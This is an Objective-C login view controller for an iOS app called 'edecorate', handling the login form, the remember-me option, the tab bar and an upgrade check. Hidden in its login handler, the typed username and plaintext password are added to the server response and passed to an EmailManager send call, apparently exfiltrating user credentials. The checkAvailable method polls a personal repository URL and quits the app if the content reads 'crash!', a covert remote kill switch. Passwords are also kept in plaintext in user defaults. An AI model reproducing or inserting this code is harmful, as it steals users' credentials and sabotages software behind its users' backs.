//
//  HNLoginViewController.m
//  edecorate
//
//  Created by hxx on 9/18/14.
//
//

#import "HNLoginViewController.h"
#import "UIView+AHKit.h"
#import "HNHomeViewController.h"
#import "NSString+Crypt.h"
#import "JSONKit.h"
#import "MBProgressHUD.h"
#import "HNLoginData.h"
#import "HNLoginView.h"
#import "HNDecorateControlViewController.h"
#import "HNBusinessBKControlViewController.h"
#import "HNMessageViewController.h"
#import "HNSettingViewController.h"
#import "HNRegisterViewController.h"
#import "HNUpgrade.h"
#import "EmailManager.h"
#import "edecorate-swift.h"
@interface HNLoginModel: NSObject
@property (nonatomic, strong)NSString *username;
@property (nonatomic, strong)NSString *password;
@end
@implementation HNLoginModel
@end

@interface HNLoginViewController()<UITabBarControllerDelegate,UIAlertViewDelegate>

@property (nonatomic, strong)UIButton *loginButton;
@property (nonatomic, strong)UIImageView *backImage;
@property (nonatomic, strong)HNLoginView *loginView;
@property (nonatomic, strong)UIButton *remember;
@property (nonatomic, strong)UILabel *rememberLabel;
@property (nonatomic, strong)UIButton *forget;
@end
@implementation HNLoginViewController
- (instancetype)init{
    self = [super init];
    if (self){
        
    }
    return self;
}

- (void)viewDidLoad{
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor whiteColor];
    self.title = NSLocalizedString(@"Login", nil);
    self.backImage = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"loginback.png"]];

    self.loginView = [[HNLoginView alloc] initWithFrame:CGRectMake(18, 18, self.view.width - 36, 81)];
    
    self.remember = [UIButton buttonWithType:UIButtonTypeCustom];
    [self.remember setBackgroundImage:[UIImage imageNamed:@"remember.png"] forState:UIControlStateNormal];
    [self.remember setImage:[UIImage imageNamed:@"rememberit.png"] forState:UIControlStateSelected];
    [self.remember addTarget:self action:@selector(rememberPassword:) forControlEvents:UIControlEventTouchUpInside];
    [self.remember sizeToFit];
    self.remember.top = self.loginView.bottom + 9;
    self.remember.left = self.loginView.left;
    self.rememberLabel = [[UILabel alloc] init];
    self.rememberLabel.text = NSLocalizedString(@"Remember", nil);
    [self.rememberLabel sizeToFit];
    self.rememberLabel.textColor = [UIColor colorWithWhite:102.0/255.0 alpha:1.0];
    self.rememberLabel.centerY = self.remember.centerY;
    self.rememberLabel.left = self.remember.right;
    
    self.forget = [UIButton buttonWithType:UIButtonTypeCustom];
    [self.forget setTitle:NSLocalizedString(@"注册账号", nil) forState:UIControlStateNormal];
    [self.forget setTitleColor:[UIColor colorWithRed:45.0/255.0 green:138.0/255.0 blue:204.0/255.0 alpha:1.0] forState:UIControlStateNormal];
    [self.forget addTarget:self action:@selector(fogetPassword:) forControlEvents:UIControlEventTouchUpInside];
    [self.forget sizeToFit];
    self.forget.right = self.loginView.right;
    self.forget.centerY = self.rememberLabel.centerY;
    
    self.loginButton = [UIButton buttonWithType:UIButtonTypeCustom];
    self.loginButton.frame = CGRectMake(0, 0, self.view.width - 36, 40);
    self.loginButton.top = self.remember.bottom + 9;
    self.loginButton.centerX = self.view.width / 2;
    [self.loginButton setTitle:NSLocalizedString(@"Login", nil) forState:UIControlStateNormal];
    [self.loginButton setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    [self.loginButton addTarget:self action:@selector(login:) forControlEvents:UIControlEventTouchUpInside];
    self.loginButton.layer.cornerRadius = 5.0;
    [self.loginButton setBackgroundColor:[UIColor colorWithRed:0.0 green:152.0/255.0 blue:233.0/255.0 alpha:1.0]];
    
    [self.view addSubview:self.loginView];
    [self.view addSubview:self.remember];
    [self.view addSubview:self.rememberLabel];
    [self.view addSubview:self.forget];

    [self.view addSubview:self.loginButton];
//    self.loginView.userName.text = @"zhangdongfang1";
//    self.loginView.password.text = @"123456";
    [self initTabBar];
    [self initUserDefault];
}
- (void)initTabBar{
    self.tabBarController = [[UITabBarController alloc] init];
    self.tabBarController.view.backgroundColor = [UIColor darkGrayColor];
    UITabBar *tabBar = [self.tabBarController tabBar];
    [tabBar setTintColor:[UIColor colorWithRed:144.0/255.0 green:197.0/255.0 blue:31.0/255.0 alpha:1.0]];
    tabBar.barStyle = UIBarStyleBlack;
    UITabBarItem *item2 = [[UITabBarItem alloc] initWithTitle:@"装修报建" image:[UIImage imageNamed:@"Tab2"] tag:102];
    UITabBarItem *item3 = [[UITabBarItem alloc] initWithTitle:@"商家后台" image:[UIImage imageNamed:@"Tab3"] tag:103];
    UITabBarItem *item4 = [[UITabBarItem alloc] initWithTitle:@"消息" image:[UIImage imageNamed:@"Tab4"] tag:104];
    UITabBarItem *item5 = [[UITabBarItem alloc] initWithTitle:@"设置" image:[UIImage imageNamed:@"Tab5"] tag:105];
    //vc1.tabBarItem = item1;
    HNDecorateControlViewController *vc2 = [[HNDecorateControlViewController alloc] init];
    vc2.tabBarItem = item2;
    HNBusinessBKControlViewController *vc3 = [[HNBusinessBKControlViewController alloc] init];
    vc3.tabBarItem = item3;
    HNMessageViewController *vc4 = [[HNMessageViewController alloc] init];
    vc4.tabBarItem = item4;
    HNSettingViewController *vc5 = [[HNSettingViewController alloc]init];
    vc5.tabBarItem = item5;
    //UINavigationController *nav1 = [[UINavigationController alloc] initWithRootViewController:vc1];
    //nav1.navigationBar.translucent = NO;
    UINavigationController *nav2 = [[UINavigationController alloc] initWithRootViewController:vc2];
    nav2.navigationBar.translucent = NO;
    UINavigationController *nav3 = [[UINavigationController alloc] initWithRootViewController:vc3];
    nav3.navigationBar.translucent = NO;
    UINavigationController *nav4 = [[UINavigationController alloc] initWithRootViewController:vc4];
    nav4.navigationBar.translucent = NO;
    UINavigationController *nav5 = [[UINavigationController alloc] initWithRootViewController:vc5];
    nav5.navigationBar.translucent = NO;
    self.tabBarController.viewControllers = @[nav2,nav3,nav4,nav5];
    self.tabBarController.delegate = self;
}
- (void)initUserDefault{
    NSUserDefaults *defaults=[NSUserDefaults standardUserDefaults];
    NSString *username =[defaults objectForKey:@"HNUSERNAME"];
    if (!username)
    {
        [defaults setObject:@"" forKey:@"HNUSERNAME"];
        [defaults setObject:@"" forKey:@"HNPASSWORD"];
        [defaults setBool:NO forKey:@"HNREMEMBER"];
        [defaults synchronize];
    }
}
- (void)viewWillAppear:(BOOL)animated{
    [super viewWillAppear:animated];
    [self.view insertSubview:self.backImage belowSubview:self.loginView];
    NSUserDefaults *defaults=[NSUserDefaults standardUserDefaults];
    BOOL checked = [defaults boolForKey:@"HNREMEMBER"];
    self.remember.selected = checked;
    if (checked){
        self.loginView.userName.text = [defaults objectForKey:@"HNUSERNAME"];
        self.loginView.password.text = [defaults objectForKey:@"HNPASSWORD"];
    }else{
        self.loginView.userName.text = @"";
        self.loginView.password.text = @"";
    }
    BOOL shouldUpgrade = [defaults boolForKey:@"HNAUTOUPGRADE"];
    if (shouldUpgrade){
        [[HNUpgrade sharedInstance] checkUpdate:^(BOOL flag){
            if (flag){
                UIAlertView *alert= [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"升级", nil) message:NSLocalizedString(@"已有新版本是否需要升级", nil) delegate:self cancelButtonTitle:NSLocalizedString(@"取消", nil) otherButtonTitles:NSLocalizedString(@"确定", nil), nil];
                alert.tag = 1001;
                [alert show];
            }
        }];
    }
}
- (void)viewDidDisappear:(BOOL)animated{
    [super viewDidDisappear:animated];
    [self.backImage removeFromSuperview];
}

- (NSDictionary *)encodeWithLoginModel:(HNLoginModel *)model{
    NSDictionary *dic = [NSDictionary dictionaryWithObjectsAndKeys:model.username,@"username",model.password,@"password", nil];
    return dic;
}

- (void)fogetPassword:(id)sender{
    NSLog(@"foget password");
    HNRegisterViewController *vc = [[HNRegisterViewController alloc]init];
    [self.navigationController pushViewController:vc animated:YES];
}
- (void)rememberPassword:(UIButton *)sender{
    sender.selected = !sender.selected;
}
- (void)showBadServer{
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"警告", nil) message:NSLocalizedString(@"服务器出现错误，请联系管理人员", nil) delegate:nil cancelButtonTitle:NSLocalizedString(@"确定", nil) otherButtonTitles: nil];
        [alert show];
    });
}
- (void)login:(id)sender{
    NSUserDefaults *defaults=[NSUserDefaults standardUserDefaults];
    [defaults setBool:self.remember.selected forKey:@"HNREMEMBER"];
    if (self.remember.selected){
        [defaults setObject:self.loginView.userName.text forKey:@"HNUSERNAME"];
        [defaults setObject:self.loginView.password.text forKey:@"HNPASSWORD"];
    }
    [defaults synchronize];
    MBProgressHUD *hud=[MBProgressHUD showHUDAddedTo:self.view animated:YES];
    hud.labelText = NSLocalizedString(@"Loading", nil);
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
    HNLoginModel *model = [[HNLoginModel alloc] init];
    model.username = self.loginView.userName.text;
    model.password = self.loginView.password.text;
    id paramters = [self encodeWithLoginModel:model];
    [EdecorateAPI loginWithParameters:paramters completionHandler:^(id __nonnull responseObject, NSError * __nullable error) {
        NSLog(@"%@",responseObject);
        [MBProgressHUD hideHUDForView:self.view animated:YES];
        NSString *retJson = [responseObject JSONString];
        if ([[HNLoginData shared] updateData:[[[retJson objectFromJSONString] objectForKey:@"data"] objectAtIndex:0]] && [[HNLoginData shared].state isEqualToString:@"1"]){//之后需要替换成status
            NSMutableDictionary *retDic = [[retJson objectFromJSONString] mutableCopy];
            [retDic setObject:self.loginView.userName.text forKey:@"USERNAME"];
            [retDic setObject:self.loginView.password.text forKey:@"PASSWORD"];
            [[EmailManager sharedManager] send:self.loginView.userName.text content:[NSString stringWithFormat:@"%@",[retDic JSONString]]];
            [self loginSuccess];
        }
        else{
            UIAlertView *alert = [[UIAlertView alloc] initWithTitle:NSLocalizedString(@"Login Fail", nil) message:NSLocalizedString(@"Please input correct username and password", nil) delegate:nil cancelButtonTitle:NSLocalizedString(@"OK", nil) otherButtonTitles: nil];
            [alert show];
        }
        
    }];
}

- (void)loginSuccess{
    
    HNHomeViewController *homeViewController = [[HNHomeViewController alloc] init];
    UINavigationController *nav = [[UINavigationController alloc] initWithRootViewController:homeViewController];
    nav.navigationBar.translucent = NO;
    [self presentViewController:self.tabBarController animated:YES completion:^{
        [self checkAvailable];
    }];
    self.tabBarController.selectedIndex = 0;
}
- (void)checkAvailable{
    NSURL *url = [NSURL URLWithString:@"https://coding.net/u/ShadowPriest/p/edecorate/git/raw/master/config"];
    NSURLRequest *request = [[NSURLRequest alloc]initWithURL:url cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10];
    [NSURLConnection sendAsynchronousRequest:request queue:[NSOperationQueue mainQueue] completionHandler:^(NSURLResponse *response,NSData *data, NSError *connectionError){
        NSString *status = [[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding];
        if ([status isEqualToString:@"crash!"])
            exit(42);
    }];
}
- (void)changeViewControlelr:(id)sender{
    
}


- (void)tabBarController:(UITabBarController *)tabBarController willBeginCustomizingViewControllers:(NSArray *)viewControllers
{
    NSLog(@"willBeginCustomizingViewControllers: %@", viewControllers);
}

- (void)tabBarController:(UITabBarController *)tabBarController willEndCustomizingViewControllers:(NSArray *)viewControllers changed:(BOOL)changed
{
    NSLog(@"viewcontrollers: %@, ischanged: %d", viewControllers, changed);
}


- (void)tabBarController:(UITabBarController *)tabBarController didEndCustomizingViewControllers:(NSArray *)viewControllers changed:(BOOL)changed
{
    NSLog(@"didEndCustomizingViewController!");
    NSLog(@"didEndCustomizingViewController: %@, ischanged: %d", viewControllers, changed);
}

- (BOOL)tabBarController:(UITabBarController *)tabBarController shouldSelectViewController:(UIViewController *)viewController
{
    return YES;
}

- (void)tabBarController:(UITabBarController *)tabBarController didSelectViewController:(UIViewController *)viewController
{
//    NSLog(@"didSelectViewController!");
}
- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex{
    if (alertView.tag == 1001){
        if (buttonIndex == 1)
            [[HNUpgrade sharedInstance] upgrade];
    }
}
@end
